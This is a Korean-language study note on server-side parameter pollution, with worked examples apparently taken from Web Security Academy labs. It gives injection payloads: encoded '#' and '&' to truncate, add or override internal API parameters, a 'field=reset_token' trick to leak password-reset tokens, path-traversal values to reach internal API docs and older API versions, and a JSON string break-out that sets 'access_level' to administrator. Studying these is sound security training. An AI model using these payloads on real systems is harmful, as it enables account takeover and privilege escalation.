## 서버 측 파라미터 오염

일부 웹 애플리케이션은 프론트엔드 서버에서 백엔드 서버로 **내부 API** 요청을 보내는 구조임. 
이러한 구조를 마이크로서비스(MSA) 구조라고 하고 현대의 웹 서비스가 많이 사용함.
``` txt
[브라우저/앱] 
     │
     ▼
[Next.js 서버] ─── (역할: 화면 SSR, 세션/쿠키 관리, API 요청 가공)
     │
     ▼ (내부 API 호출)
[Core 백엔드 서버 (Spring / Go)] ─── (역할: 핵심 비즈니스 로직, 결제, 대용량 트랜잭션, DB 관리)
```

해커는 파라미터를 조작하거나 악의적인 데이터를 삽입할 수 있음. 쿼리 파라미터, 폼 필드, 헤더, URL 경로 파라미터 등에서 모두 공격 가능성이 있음. 

예를 들어 브라우저에서 프로필 정보를 요청할때 `name=peter`를 담아서 보낸다고 할때, 프론트엔드 서버에서 공개된 정보만을 보여주도록 하는 `publicProfile=true`를 추가해서 백엔드 서버로 내부 API 요청을 보내는 구조일 수 있음. 

- 브라우저의 요청 
``` http
GET /userSearch?name=peter
```

- 서버의 내부 API 요청
``` http 
GET /users/search?name=peter&publicProfile=true
```


### 쿼리 문자열

1. 문자열 잘라내기: `#`로 쿼리 문자열을 잘라낼 수 있음. **`#` 문자는 반드시 URL 인코딩**해야 함. 그렇지 않으면 프론트엔드 애플리케이션이 이 문자를 프래그먼트 식별자로 해석하게 되어, 내부 API로 전달되지 않음.

- 브라우저 요청
``` http
GET /userSearch?name=peter%23foo
```

- 서버의 내부 API 요청
``` http 
GET /users/search?name=peter#foo&publicProfile=true
```


2. 매개변수 추가: `&`로 매개변수를 추가할 수 있음. 유효한 파라미터일 수도 있고 아닐 수도 있음. **응답 메시지로 추가된 매개변수가 어떻게 처리되는지에 대한 단서를 얻을 수 있음.** 
``` http
GET /userSearch?name=peter%26email=foo
```

3. 기존 매개변수 덮어쓰기: `&`로 매개변수를 덮어쓸 수 있음. 
``` http
GET /userSearch?name=peter%26name=carlos
```
- 두 개의 `name` 매개변수를 어떻게 해석할지에 대해서는 웹 프레임워크에 따라 다름. 
	- PHP는 마지막 매개변수만을 해석
	- Node.js(Express)는 첫 번째 매개변수만을 해석
	- ASP.NET은 두 매개변수를 모두 결합. 이로 인해 사용자가 `peter,carlos` 을 검색할 경우, `Invalid username` 오류 메시지가 표시될 수 있음.
- 원래의 파라미터를 무시할 수 있다는 것을 확인하면 **내부 API에서 추가되는 매개변수를 덮어씌워 약용할 수 있음.** 


#### 예시

비밀번호 재설정 요청
``` http
POST /forgot-password HTTP/2
Host: 0ad10037037472bf82ed603d005500bf.web-security-academy.net
Cookie: session=pTsC0rydX6AZnJ09vOjoWKFRLOJNr9gX
Content-Type: x-www-form-urlencoded

csrf=7qzq8hlafp44MKUt9qlz39wuGCU1jadp&username=administrator
```

응답 
``` http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 49

{
	"result":"*****@normal-user.net",
	"type":"email"
}
```

`username` 매개변수로 받은 계정의 이메일로 비밀번호 재설정 토큰을 보내는 구조임을 알 수 있음. 
1. `username=administrator%26x=y`를 보낸 경우 (`&x=y` 추가): Parameter is not supported 오류 메시지가 반환되는 것으로 보아 내부 API에서 `x=y`를 별도 파라미터로 해석하는 것을 알 수 있음. 
2. `username=administrator%23`를 보낸 경우 (`#` 추가): Field not specified 오류 메시지가 반환되는 것으로 보아 서버측에서 내부 API 요청을 보낼때 `field` 매개변수가 추가되는데 `#`로 제거된 것을 알 수 있음. 
3. `&field=x#`를 추가한 경우: Invalid field 오류 메시지가 반환되는 것으로 보아 브라우저에서 주입한 `field` 매개변수가 서버 측 애플리케이션에서 사용되는것을 알 수 있음. 

내부 서버의 구조는 프론트엔드/중간 서버에서 해당 `username` 사용자의 정보를 `field`라는 매개변수로 백엔드 서버에 요청을해서 가져오고, 그 정보로 비밀번호 재설정 로직을 처리한 후 데이터를 브라우저에 응답으로 보여주는 취약한 마이크로서비스(MSA) 구조임. 
``` txt
[유저 요청: 비밀번호 찾기]
       │
       ▼
[프론트엔드 / 중간 서버 (Node.js)]
       │
       ├── 1단계: "유저 서비스"에 요청
       │          GET /internal/users?username=admin&field=email
       │          (목적: 사용자 존재 여부 확인 및 마스킹된 이메일 획득)
       │
       ├── 2단계: "인증 서비스"에 요청
       │          POST /internal/tokens/generate
       │          (목적: 재설정 토큰 발급)
       │
       └── 3단계: "메일 서비스"에 요청
                  POST /internal/email/send
                  (목적: 획득한 이메일로 토큰 발급 메일 전송)
```

취약점 
- 사용자 정보를 조회하는 내부 API `GET /internal/users?username=admin&field=email`를 재사용하는 구조임. 
- 프론트엔드에서 응답 처리 공통화를 위해서 `{ "result":"*****@normal-user.net", "type":"email" }`처럼 `result`, `type`를 보여주는 방식 (이것 자체는 정상적인 응답 공통 처리 포맷임.)

결과 
- `field`에 `reset_token`으로 바꿔서 요청을 보내면 응답으로 비밀번호 재설정 토큰을 받을 수 있음.

### REST API 경로 파라미터

RESTful API의 경우, 파라미터으 이름과 값은 쿼리 문자열이 아닌 URL 경로에 포함될 수 있음. 
- RESTful API 잘못된 예: `/getUsers`, `/deleteUser/12`
- RESTful API 올바른 예: `GET /users/123`, `DELETE /users/123`

만약 사용자명을 기반으로 해당 사용자의 프로필을 편집할 수 있는 애플리케이션인 경우

- 브라우저 요청
``` http
GET /edit_profile.php?name=peter
```

- 서버의 내부 API 요청
``` http
GET /api/private/users/peter
```

공격자는 서버 측의 URL 경로 매개변수를 조작하여 API를 악용할 수 있음. `peter/../admin` 을 URL 인코딩한 형태로 `name` 파라미터의 값으로 전송할 수 있음.

- 브라우저 요청
``` http
GET /edit_profile.php?name=peter%2f..%2fadmin
```

- 서버의 내부 API 요청
``` http
GET /api/private/users/peter/../admin
```


경로를 공격할 때 사용하는 특수문자
- `%2f..%2f..%2f`: 경로 이탈
- `%23`: `#`, 뒤에 오는 쿼리 무시
- `%3f`: `?`, 파라미터 조작


#### 예시

비밀번호 재설정 요청
``` http
POST /forgot-password HTTP/2
Host: 0ad10037037472bf82ed603d005500bf.web-security-academy.net
Cookie: session=pTsC0rydX6AZnJ09vOjoWKFRLOJNr9gX
Content-Type: x-www-form-urlencoded

csrf=7qzq8hlafp44MKUt9qlz39wuGCU1jadp&username=administrator
```

응답 
``` http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 49

{
	"result":"*****@normal-user.net",
	"type":"email"
}
```


1. `username`에 `%2f..%2f..%2f`, `%23`, `%3f`를 넣어보면서 응답 메시지를 보면 해당 경로로 조작이 가능하다는 것을 알 수 있음. 
2. `username`을 통해서 내부 경로에 접근
	- `username=..%2f..%2f..%2f`를 넣다보면 에러메시지가 바뀌는 경우가 생기는데 여기가 루트 디렉토리임. 
3. API 문서 찾기
	- 루트 디렉토리에서 `/openapi.json`와 같은 경로로 접근함. 
	- 실무에서는 자동화 툴을 사용해서 찾음. 
	- API 문서를 보면 내부적으로 어떤 경로를 통해 내부 API 요청을 보내는지 알 수 있음. 
4. 해당 경로로 요청을 보내면 `email`만 가능하다고 에러가 발생하지만 버전을 바꿔서 보내면 성공함. 
	- 새로운 버전을 배포하면서 보안을 강화했지만, 하위 호환성이나 귀찮음 때문에 구버전/테스트버전을 서버에서 지우지 않고 방치하는 경우가 실무에서 어마어마하게 많음.



### 구조화된 데이터

사용자(브라우저)가 웹 서버로 일반적인 폼 데이터(`name=peter`)나 단순한 형태의 JSON을 보내면, 웹 서버가 그 값을 받아 내부망에 있는 다른 백엔드 API(또는 마이크로서비스)로 요청을 보낼 때 JSON이나 XML 같은 구조화된 형태로 포장해서 보내는 경우

이때 웹 서버가 사용자의 입력값을 안전하게 인코딩(처리)하지 않고 **단순 문자열 더하기(결합)** 방식으로 JSON을 만들 때 취약점이 발생함. 

일반적인 상황
- 브라우저 요청
``` http
POST /myaccount
name=peter
```

- 서버의 내부 API 요청
``` http
PATCH /users/7312/update
{"name":"peter"}
```

해커의 공격
- 브라우저 요청
``` http 
POST /myaccount
name=peter","access_level":"administrator
```
- JSON인 경우
``` http
POST /myaccount
{"name": "peter\",\"access_level\":\"administrator"}
```

- 서버의 내부 API 요청
``` http
PATCH /users/7312/update
{"name":"peter","access_level":"administrator"}
```
